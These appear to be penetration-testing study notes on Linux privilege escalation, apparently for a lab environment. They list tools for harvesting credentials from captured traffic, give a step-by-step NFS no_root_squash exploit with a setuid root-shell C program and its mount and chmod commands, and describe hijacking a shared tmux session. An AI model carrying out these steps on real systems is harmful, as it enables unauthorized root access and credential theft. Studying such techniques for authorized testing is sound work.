## Passive Traffic Capture

tcpdump installed -> capture network traffic

Tools:
- net-creds
- PCredz

## Weak NFS Privileges
NFS - Network File System TCP/UDP port 2049

**From Attack Machine
```shell-session
showmount -e 10.129.2.12
```
- If "no_root_squash" is set, it is vulnerable

**Check exports on vulnerable machine
```shell-session
cat /etc/exports
```

**Create binary (shell.c in /tmp on target)
```shell-session
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```

**Compile Binary on target
```shell-session
gcc shell.c -o shell
```

**Mount from attack box as root
```shell-session
sudo mount -t nfs 10.129.2.12:/tmp /mnt
cp shell /mnt
chmod u+s /mnt/shell
```

**Execute on vulnerable machine
```shell-session
./shell
id
```

## Hijacking Tmux Sessions
- Must be in devs group
```shell-session
tmux -S /shareds new -s debugsess
chown root:devs /shareds
```

**Check for tmux processes
```shell-session
ps aux | grep tmux
ls la /shareds
id
tmux -S /shareds
```
